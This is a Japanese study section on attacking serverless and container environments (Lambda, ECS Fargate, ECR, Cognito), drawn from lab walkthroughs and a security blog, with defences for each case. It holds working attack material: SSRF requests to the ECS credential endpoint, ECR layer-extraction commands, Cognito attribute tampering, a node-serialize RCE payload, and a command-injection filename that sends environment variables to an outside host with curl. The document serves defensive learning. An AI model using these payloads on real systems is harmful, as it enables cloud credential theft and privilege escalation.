## サーバレス実践ラボと日本語解説

本節では、サーバレス／コンテナ環境（AWS Lambda、API Gateway、ECS Fargate、ECR、Cognito）に対する攻撃手法を、公開されている学習用ラボ（flaws2.cloud、CloudGoat）と国内の技術解説記事（GMO Flatt Security ブログ）を通じて整理する。ここで扱うのはすべて自分専用の学習環境またはCTF形式の練習用インフラであり、実在の本番サービスに対して同様の手順を無許可で試みることは不正アクセス禁止法等に抵触しうるため厳禁である。本節の目的は「なぜその設定が危険なのか」という原理を理解し、自分たちのクラウド環境の防御に活かすことにある。

### 1. flaws2.cloud ― サーバレス／コンテナの攻守両面ラボ

flaws2.cloud は、flAWS.cloud の作者（Scott Piper）が公開している第二弾のクラウドセキュリティ学習サイトで、「Attacker（攻撃者）」と「Defender（防御者／インシデントレスポンダー）」という2つのパスから構成される。Attacker パスでは Lambda（サーバレス関数）と ECS Fargate（コンテナオーケストレーション）の設定ミスを突く一方、Defender パスでは同じアプリケーションを「被害を受けた側」として見て、実際の攻撃ログを CloudTrail/Athena/jq で解析する演習になっている。攻守双方を体験できる構成そのものが、実務での「攻撃者視点のペネトレーションテスト」と「防御側のログ解析・インシデントレスポンス」を橋渡しする教材として設計されている点が特徴である。

> ⚠️ **未取得の資料**: 「flAWS2.cloud」公式サイト本体（http://flaws2.cloud/）は、本セクション作成時にネットワーク接続エラー（ECONNRESET、複数回リトライも失敗）により自動取得できませんでした。以下のURLからご自身で直接ご覧ください: http://flaws2.cloud/
> 以下は代替として取得した複数の日本語・英語ウォークスルー記事（`kishoreramk.medium.com`、`muratbekgi.com`、`executeatwill.com` 等の要約）と一般知識に基づく解説です。

#### 1-1. Level 1: クライアント側バリデーションの回避とエラーレスポンスからの認証情報漏えい

最初のレベルはブラウザ上で「PINコードを入力してください」という画面が表示される。フォームはJavaScriptによって数字4桁のみを許可するようにクライアント側で制限されているが、これはあくまで見た目上の制約であり、開発者ツール（ブラウザのNetworkタブ）からリクエストを直接書き換えれば、サーバー側（API Gateway → Lambda）には任意の文字列を送信できる。

```bash
# 期待される入力（数字）ではなく文字列を送るようリクエストを改ざんする
# → Lambda側でパース処理が失敗し、スタックトレース付きの500エラーが返る
```

このとき返される500エラーのレスポンスボディには、Lambda関数のソースコードの一部やデバッグ情報が含まれており、そこに `AWS_ACCESS_KEY_ID` や `AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN` が平文で埋め込まれていた、というのがこのレベルの核心である。

```bash
# 得られた一時クレデンシャルをAWS CLIのプロファイルとして登録
aws configure --profile level1
aws sts get-caller-identity --profile level1
aws s3 ls s3://level1.flaws2.cloud --profile level1
```

**なぜこれが起きるのか（仕組みレベル）**: Lambda関数は実行時にIAMロールから一時クレデンシャル（STSのAssumeRoleによって発行されるアクセスキー・シークレットキー・セッショントークンの3点セット）を受け取り、これを環境変数として実行コンテキストに保持する。多くのランタイムでは、未処理の例外が発生した際にデバッグ目的で環境変数一覧やスタックトレースをそのままレスポンスに出力してしまう実装が見られる。クライアント側のバリデーションはあくまでUXのためのものであり、信頼境界（trust boundary）の外側にあるブラウザ側のJavaScriptを「本当の入力検証」として扱ってしまうと、この種の迂回は常に成立する。防御としては、(1) サーバー側（Lambda本体）でも型・形式チェックを独立して行う、(2) 本番環境では詳細なスタックトレースやデバッグ情報をレスポンスに含めない（`try/except`で汎用エラーメッセージに丸める）、(3) 環境変数に直接シークレットを置かず、実行時にAWS Secrets ManagerやSSM Parameter Storeから都度取得する設計にする、という三段構えが基本になる。

> 出典: flAWS2.cloud（http://flaws2.cloud/）ならびに関連ウォークスルー（KISHORERAM「Flaws2.cloud WalkThrough」、Murat Bekgi「flaws2.cloud walkthrough」） — http://flaws2.cloud/ / https://kishoreramk.medium.com/flaws2-cloud-walkthrough-aws-cloud-security-5540360e512f / https://www.muratbekgi.com/flaws2-cloud-walkthrough-all-flaws2-cloud-levels/

#### 1-2. Level 2: パブリックなECRリポジトリからのイメージ層抽出とクレデンシャル発見

続くレベルはコンテナ（`http://container.target.flaws2.cloud/`）として稼働している。ここで着目すべきは「S3バケットだけでなく、ECR（Elastic Container Registry）などAWS上の他のリソースにも“意図しない公開権限”が付与され得る」という点である。この演習ではリポジトリ名 `level2` のECRリポジトリが外部から読み取り可能な設定になっている。

```bash
# 対象アカウントの公開ECRリポジトリからイメージ一覧・マニフェストを取得
aws ecr list-images --repository-name level2 --registry-id 653711331788
aws ecr batch-get-image --repository-name level2 --image-ids imageTag=latest
aws ecr get-download-url-for-layer --repository-name level2 --layer-digest "sha256:<digest>"
```

取得したマニフェストJSONから各レイヤーのdigestを取り出し、レイヤー（実体はtar.gzのファイルシステム差分）を個別にダウンロードして展開すると、Dockerイメージのビルド過程で埋め込まれた設定ファイル（例: `/etc/nginx/.htpasswd`）の中に認証情報が残っていることが分かる。

**なぜこれが起きるのか**: Dockerイメージはレイヤー構造を持ち、各レイヤーは「そのビルドステップで変更されたファイル群」の差分アーカイブである。`Dockerfile`内で `COPY secrets.txt /app/` のように一度でもファイルをイメージにコピーしてしまうと、たとえ後続のステップで `rm secrets.txt` によって最終的なファイルシステム上から見えなくしても、そのファイルを含むレイヤー自体はイメージの一部としてレジストリに残り続け、レイヤー単位でダウンロードすれば復元できてしまう。これはLambdaのコンテナイメージデプロイ（Lambdaは.zipパッケージだけでなくコンテナイメージからも作成可能）やECS/Fargateのタスク定義で使うイメージでも同様に起こり得る典型的な事故パターンである。防御としては、(1) ビルド時のみ必要な機密情報はマルチステージビルドで最終イメージに含めない、(2) レジストリのIAMポリシー・リソースベースポリシーで匿名/クロスアカウントアクセスを明示的に拒否する、(3) 一度露出したシークレットはイメージから削除するだけでなく必ずローテーションする、という点が重要になる。

> 出典: flAWS2.cloud Level 2 ウォークスルー（Murat Bekgi、KISHORERAM 各記事） — http://flaws2.cloud/ / https://www.muratbekgi.com/flaws2-cloud-walkthrough-all-flaws2-cloud-levels/

#### 1-3. Level 3: プロキシ機能を悪用したSSRFとECSタスクロール窃取

このレベルのコンテナアプリケーションには、指定したURLの内容を取得して返す「プロキシ」機能（`http://container.target.flaws2.cloud/proxy/<URL>`）が実装されている。これは典型的なSSRF（Server Side Request Forgery、サーバー自身に任意の宛先へリクエストを発行させる脆弱性）の温床であり、アクセス先URLのホワイトリスト検証が行われていないと、外部向けのURLだけでなく、コンテナ自身のローカルファイルシステムやクラウド内部のメタデータエンドポイントへもアクセスできてしまう。

```bash
# ① コンテナ内部のプロセス環境変数を読み取り、ECSタスクの資格情報エンドポイントURIを特定
curl http://container.target.flaws2.cloud/proxy/proc/self/environ
# → 出力中に AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/<GUID> が含まれる

# ② ECSタスクメタデータのクレデンシャルエンドポイント(169.254.170.2)へプロキシ経由でアクセス
curl "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/<GUID>"
# → タスクにアタッチされたIAMロールの一時クレデンシャルがJSONで返る

# ③ 得られた資格情報でS3等の権限を確認
aws s3 ls --profile level3-task-role
```

**なぜこれが起きるのか（仕組みレベル）**: ECS FargateやEC2上のECSタスクは、EC2インスタンスメタデータサービス（IMDS、`169.254.169.254`）に類似した仕組みとして、タスク単位のクレデンシャル配布エンドポイント（`169.254.170.2`、ECS Task Metadata/Credentials Endpoint）を持つ。コンテナ内のプロセスは環境変数 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` に設定されたパスへHTTPリクエストを送るだけで、そのタスクにアタッチされたIAMロールの一時クレデンシャルを取得できる設計になっている。これは通常、コンテナ内の正規のAWS SDKが自動的に利用するための機能だが、アプリケーションにSSRF脆弱性（今回はURLプロキシ機能）が存在すると、攻撃者は「コンテナの内部ネットワーク視点」からこのリンクローカルアドレスにアクセスでき、正規のSDKと同じ手順でロールの資格情報を丸ごと奪取できてしまう。`/proc/self/environ` を読める点自体もパストラバーサル／ローカルファイルアクセスの一種であり、プロキシ実装がスキーム（`http://`）や宛先ホストの検証を行っていないことがすべての元凶である。防御としては、(1) SSRFの一般的対策（宛先ホストのアローリスト化、リダイレクト追跡の禁止、`169.254.0.0/16` などリンクローカル帯域への到達をネットワークポリシーやiptablesで遮断）、(2) ECSタスクロールにも最小権限の原則を適用し、仮に漏えいしても被害を限定する、(3) IMDSv2相当の追加ヘッダー要求（ECS版では `ECS_AGENT_URI` の資格情報にトークンを要求する設定強化）を有効にする、といった多層防御が求められる。

> 出典: flAWS2.cloud Level 3（SSRF/ECSメタデータ）ウォークスルー（Murat Bekgi「flaws2.cloud walkthrough」） — https://www.muratbekgi.com/flaws2-cloud-walkthrough-all-flaws2-cloud-levels/

なお、flaws2.cloudにはこの後もLambdaの権限昇格やDefenderパス（CloudTrailログをjq・Athenaで解析し、実際の侵入経路を特定する演習）が続くが、本節作成時点の自動取得ではLevel 1〜3までの詳細のみが確認できた。Defenderパスの学習価値は高く、「攻撃者がどの順序でAPIコールを行ったか」をCloudTrailの `eventName`・`sourceIPAddress`・`userIdentity` から時系列に再構成する訓練は、実務のインシデントレスポンスに直結するため、関心があれば公式サイトで直接取り組むことを推奨する。

### 2. CloudGoat vulnerable_cognito ― Cognitoの認可バイパスによる権限昇格

CloudGoat は Rhino Security Labs が公開している「意図的に脆弱なAWS環境」をTerraformで構築するCTF形式のツールで、`vulnerable_cognito` はその中の1シナリオである。目的は「Cognito Identity Poolから有効なAWSアクセスキーを取得すること」で、小〜中規模の難易度に分類される。

構成としては、API Gateway経由でログイン・サインアップ用のWebページが提供され、その裏でAmazon Cognito User Pool（ユーザーのID・パスワードなどを管理する認証基盤）とCognito Identity Pool（認証済みユーザーに一時的なAWS IAM権限を払い出す仕組み）が連携している。攻撃の流れは次の6段階である。

```bash
# ① まずWebのサインアップフォームからメールアドレス確認(検証コード送信)を試みるが、
#    実在しないメールドメイン等のためサーバー側検証で弾かれる

# ② ブラウザの開発者ツール(ページソース/Networkタブ)から、
#    フロントエンドに埋め込まれた Cognito User Pool の App Client ID を取得する

# ③ AWS CLIで直接 Cognito User Pool に対してサインアップ・メール確認を行い、
#    Webフォーム側のクライアントサイド検証を完全にバイパスする
aws cognito-idp sign-up \
  --client-id <取得したClientID> \
  --username attacker@example.com \
  --password "P@ssw0rd123!"

aws cognito-idp admin-confirm-sign-up \
  --user-pool-id <UserPoolID> \
  --username attacker@example.com
# (演習環境では管理者権限のCLIでconfirmまで進められるよう構築されている、
#  もしくは自己確認可能な設定ミスが想定される)

# ④ 作成したユーザーでログインし、reader.html等のページで
#    「サインアップ後に付与されるカスタムユーザー属性(custom:xxx)」の存在を発見する

# ⑤ カスタム属性の値をAWS CLIで書き換え、権限昇格を狙う
aws cognito-idp update-user-attributes \
  --access-token <ログインで取得したAccessToken> \
  --user-attributes Name="custom:role",Value="admin"

# ⑥ 再ログインし、Cognito Identity Poolが発行するAWS一時クレデンシャルを
#    (Burp Suiteなどでレスポンスを観察して)取得する
aws sts get-caller-identity --profile stolen-identitypool-creds
```

**なぜこれが起きるのか（仕組みレベル）**: Cognito User Poolのカスタム属性（`custom:` プレフィックスを持つ属性）は、デフォルトでは「アプリケーションクライアント側から書き込み可能（writable）」に設定されることがある。本来、`custom:role` のような権限に関わる属性はアプリケーションのバックエンド（サーバー側）だけが書き込めるように `Mutable` かつ「書き込み権限を持つクライアントを限定する」設定にすべきだが、これが緩い設定のまま公開されていると、ユーザー自身がAWS CLIから直接 `update-user-attributes` を呼び出すだけで、本来サーバー側だけが決定すべき「自分の権限レベル」を自己申告的に書き換えられてしまう。さらにCognito Identity Poolは、User Poolでの認証結果（IDトークン内のクレーム、ここには先ほど書き換えたカスタム属性も含まれ得る）を条件としたロールマッピング（Role-based Access Control）で、認証済みユーザーにどのIAMロールを引き受けさせるかを決定する。つまり「クライアント側で改ざん可能な属性」を「IAMロール選択の判断材料」に使ってしまうと、認可ロジックの信頼の起点がクライアントに漏れ出し、権限昇格が成立する。また、そもそも最初のサインアップ段階で「クライアント側のみのバリデーション（フォームの入力チェック）」に依存し、サーバー側でのメールドメイン・招待コード等の検証を欠いていた点も、無関係なユーザーがユーザープールに登録できてしまう入口として機能している。

防御としては、(1) `custom:` 属性のうち権限判定に使うものは、Cognitoのユーザー属性スキーマ定義で該当App Clientからの書き込み権限（Writable Attributes）を明示的にオフにする、(2) 権限やロールの決定はIDトークンのクレームをそのまま信じるのではなく、バックエンドのDB等サーバー側が真の情報源（source of truth）となるようにする、(3) Identity PoolのRole Mappingで「認証済みユーザーに払い出すIAMロール」自体にも最小権限を適用し、仮に昇格されても実害を局所化する、(4) サインアップ・確認フローはサーバー側でもレート制限・ドメイン検証・招待制などを併用する、という点が基本方針になる。

> ⚠️ **未取得の資料**: 担当URLの「ro0taddict『AWS Pentesting: Cloudgoat’s vulnerable_cognito』」記事本文（https://rodelllemit.medium.com/aws-pentesting-cloudgoat-vulnerable-cognito-0d6e3809dada）は、Mediumのアクセス制限（HTTP 403 Forbidden）により自動取得できませんでした。以下のURLからご自身で直接ご覧ください: https://rodelllemit.medium.com/aws-pentesting-cloudgoat-vulnerable-cognito-0d6e3809dada
> 上記の攻撃手順および仕組みの解説は、代替取得したCloudGoat公式シナリオREADME（GitHub: RhinoSecurityLabs/cloudgoat, `scenarios/aws/vulnerable_cognito/README.md`）の内容と、同シナリオを扱う複数の独立したウォークスルー（Cyber Anom、reveng007、hackingthe.cloud、TrustOnCloud）の要約情報を突き合わせて構成した、一般知識も交えた解説です。細部のコマンドオプションは実際のシナリオ環境によって異なる場合があるため、正確な手順は原文および自分の演習環境で確認してほしい。

> 出典: CloudGoat `vulnerable_cognito` シナリオ README（RhinoSecurityLabs） — https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vulnerable_cognito/README.md
> 参考: Hacking The Cloud「Abusing Overpermissioned AWS Cognito Identity Pools」 — https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/

### 3. 【日本語】Lambda/サーバーレス特有の脆弱性クラス（GMO Flatt Security）

GMO Flatt Securityのブログ記事「サーバーレスのセキュリティリスク - AWS Lambdaにおける脆弱性攻撃と対策」（2022年3月16日公開、同年3月17日にSecrets Managerに関する記述を追加）は、Lambda関数自体のアプリケーションコードに潜みがちな脆弱性クラスを、OWASP Serverless Top 10を軸に整理している。サーバレス関数はステートレスな「グルーコード」として軽視されがちだが、実際には通常のWebアプリケーションと同種の脆弱性がそのまま持ち込まれ、しかもIAMロールという強力な権限が紐づいている分、被害が単なる情報漏えいに留まらずAWSアカウント全体への波及に直結しやすい。

#### 3-1. OSコマンドインジェクション（CWE-78）によるクレデンシャル外部送信

```python
subprocess.call(
    'cd /tmp; convert {FileName} {Path}{File}'.format(
        FileName=download_file, Path=path, File=name
    ),
    shell=True
)
```

`download_file` にユーザーが指定したファイル名がそのまま文字列結合されており、`shell=True` でOSのシェルにコマンド文字列全体を渡している。ここでファイル名として次のような値を与えると、セミコロンでコマンドが区切られ、任意コマンドが追加実行される。

```
hoge; printenv | curl X.X.X.X --data-urlencode @-; #.jpg
```

**なぜ危険か**: Lambdaの実行環境では、そのLambda関数にアタッチされたIAMロールの一時クレデンシャル（`AWS_ACCESS_KEY_ID`・`AWS_SECRET_ACCESS_KEY`・`AWS_SESSION_TOKEN`）が環境変数として自動的に渡される。`printenv` はプロセスの環境変数を一覧表示するコマンドであり、これを外部サーバーへPOSTするワンライナーを注入されると、Lambda関数の実行権限（＝IAMロールの権限）がまるごと攻撃者の手に渡ってしまう。対策は、シェル経由の外部コマンド実行を避け（`subprocess.call([...], shell=False)`のように引数配列で渡す、あるいは専用ライブラリを使う）、ユーザー入力をコマンド文字列へ直接連結しないことに尽きる。

#### 3-2. XXE（XML External Entity、CWE-611）によるローカルファイル読み取り

```python
parser = etree.XMLParser()
document = etree.fromstring(download_file, parser)
```

デフォルト設定のXMLパーサーは外部エンティティの解決を許可していることが多く、攻撃者が細工したXML内で外部エンティティを定義すると、`file:///var/task/handler.py`（Lambda関数のソースコード本体）や `file:///proc/self/environ`（プロセスの環境変数、ここにもクレデンシャルが含まれる）を読み込ませることができる。パーサーの安全な初期化（外部エンティティ解決の無効化、たとえばPythonの`lxml`であれば`resolve_entities=False`かつDTD処理を無効化する等）が根本対策となる。

#### 3-3. 安全でないデシリアライズ（CWE-502）とnode-serializeの実例

Node.js向けの `node-serialize` パッケージ（バージョン0.0.4、CVE-2017-5941）は、シリアライズされたオブジェクトを復元する際に内部で`eval()`相当の処理を行っていたため、次のようなペイロードで任意コード実行が可能だった。

```json
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('printenv', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

**なぜ危険か**: デシリアライズ処理は「データを受け取ってプログラム内部のオブジェクトに復元する」という一見安全そうな操作だが、復元のためのロジックに`eval`のような動的コード評価が使われていると、シリアライズされたデータ自体が実行可能コードの運び屋になってしまう。これは言語・ライブラリを問わず繰り返し現れるパターン（Javaの`ObjectInputStream`、PHPの`unserialize`なども同種のリスクを持つ）であり、外部入力を信頼できない形式のままデシリアライズしないこと、信頼済みライブラリの既知CVEを継続的に追跡することが対策になる。

#### 3-4. SSRF（CWE-918）― Lambda Runtime APIやローカルファイルへの到達

```javascript
request.get(url, (error, response, body) => {
  resolve(response)
})
```

ユーザーが指定したURLをそのままHTTPクライアントに渡している場合、`http://localhost:9001/2018-06-01/runtime/invocation/next`（Lambdaのランタイムインターフェース）や`file://`スキーマ経由での`/proc/self/environ`読み込みが可能になる。実例として、PDF生成ライブラリ`reportlab`のCVE-2020-28463では、PDF内の`<img>`タグを通じてSSRFが引き起こされたことが紹介されている。対策はURLのスキーム・宛先ホストをアローリスト方式で検証し、リダイレクトも含めて内部アドレス帯（ループバック、リンクローカル、プライベートIPレンジ）への到達を遮断することである。

#### 3-5. IAMロールと環境変数管理、監視・監査の設計

記事はこれらの脆弱性が共通して「IAMロールのクレデンシャルが環境変数から奪取される」という最終的な被害に収斂する点を強調し、対策として次を挙げている。

- **最小権限の原則**でLambda実行ロールを設計し、IAMのアクセス許可境界（permissions boundary）も併用する。
- シークレットは環境変数への直書きではなく、**AWS Secrets Manager**や**SSMパラメータストア**から実行時に取得する（2022年3月17日の更新で追記された観点）。
- 依存パッケージは最新版を維持し、不要な依存を削除、Lambda Layersで共通ライブラリを一元管理する（OWASP Serverless Top 10の「既知の脆弱性のあるコンポーネント使用」に対応）。
- **CloudWatch**でメトリクス・アラームを設定し、**CloudTrail**のデータイベント（デフォルト無効、有効化には追加コストが発生する点に注意）でLambdaの実行記録を残し、**AWS X-Ray**でInitialization/Invocation/Overheadの各フェーズをトレースする。**AWS Config**のマネージドルールで同時実行数制限やパブリックアクセス禁止などの設定逸脱を継続的に検知する。
- **AWS Signer**によるコード署名で、デプロイされるコードの整合性・有効期限・署名の失効状態を検証する。

これらはいずれも「実行環境がコンテナ的に使い回される」「クレデンシャルが環境変数という比較的アクセスしやすい場所に置かれる」というLambda特有の実行モデルを前提にした対策であり、flaws2.cloudやCloudGoatの演習で実際に悪用された経路（デバッグ出力、SSRF経由のメタデータ窃取）に直接対応している点に注目してほしい。

> 出典: GMO Flatt Security「サーバーレスのセキュリティリスク - AWS Lambdaにおける脆弱性攻撃と対策」 — https://blog.flatt.tech/entry/lambda_and_serverless_security

### 4. 【日本語】GMO Flatt Security Blog AWSカテゴリの関連記事

GMO Flatt Security BlogのAWSカテゴリ一覧からは、サーバレス／クラウドセキュリティに関連する日本語記事が多数見つかる。特に本節のテーマと関連が深いのは次の3本である。

- **「重複したIAM、拒否と許可どっちが優先？」（2024年12月4日）**: AWS・Google Cloud・Azure・Firebaseそれぞれについて、ポリシー内に`Allow`（許可）と`Deny`（拒否）が重複・競合した場合にどちらが優先されるかを、クイズ形式で比較解説している。AWSのIAMポリシー評価ロジックでは、明示的な`Deny`が常に明示的な`Allow`より優先される（暗黙のDenyがデフォルトであり、複数のポリシーを跨いでも明示的Denyが最終的に勝つ）という評価順序（Explicit Deny > Explicit Allow > Implicit Deny）を理解しておくことは、本節で扱ったような「複数のIAMロール・ポリシーが絡む権限昇格経路」を正しく設計・監査するうえで基礎になる。
- **「AWS Lambdaで秘密情報をセキュアに扱う」（2022年11月8日）**: 前節のLambda脆弱性解説を補完する内容で、環境変数への直書きを避けSecrets Manager/Parameter Storeを使う具体的な実装パターンを扱っている。
- **「Lambdaの落とし穴 - 脆弱なライブラリによる危険性とセキュリティ対策」（2022年2月24日）**: 依存ライブラリの脆弱性がLambda関数経由でどう悪用されるかを扱っており、3-3節のnode-serialize事例と同種の問題を別の切り口から補強する。

> 出典: GMO Flatt Security Blog AWSカテゴリ一覧 — https://blog.flatt.tech/archive/category/AWS

### 5. まとめ ― サーバレス／コンテナ攻撃の共通パターン

本節で扱った3つの資料（flaws2.cloud、CloudGoat vulnerable_cognito、GMO Flatt Securityのブログ2本）を横断して見えてくるのは、サーバレス／コンテナ環境における攻撃の多くが、次の3つのいずれか（またはその組み合わせ）に帰着するという構造である。

1. **信頼境界の取り違え**: クライアント側のバリデーションやクライアントが書き換え可能な属性（Cognitoのカスタム属性）を、サーバー側の認可判断の根拠にしてしまう。
2. **メタデータ／クレデンシャル配布エンドポイントへの到達**: SSRFやローカルファイル読み取り系の脆弱性（XXE、コマンドインジェクション経由の環境変数窃取）を通じて、Lambda/ECSが持つ一時クレデンシャルに到達する。
3. **意図しない公開設定の見落とし**: S3バケットだけでなくECRリポジトリのような周辺リソースにも公開・過剰権限の設定ミスが起こり得る。

これらはいずれも「クラウドのサービスモデルが便利にしてくれる自動化（IAMロールの自動クレデンシャル発行、Identity Poolによる自動ロール割当、コンテナレジストリの共有）」の裏側に、攻撃者にとっての近道が生まれるという構図であり、防御側としては最小権限の徹底、サーバー側での多層検証、そしてCloudTrail等による継続的な監査ログの活用が、これらの演習全体を貫く一貫した対策方針であることを押さえておきたい。
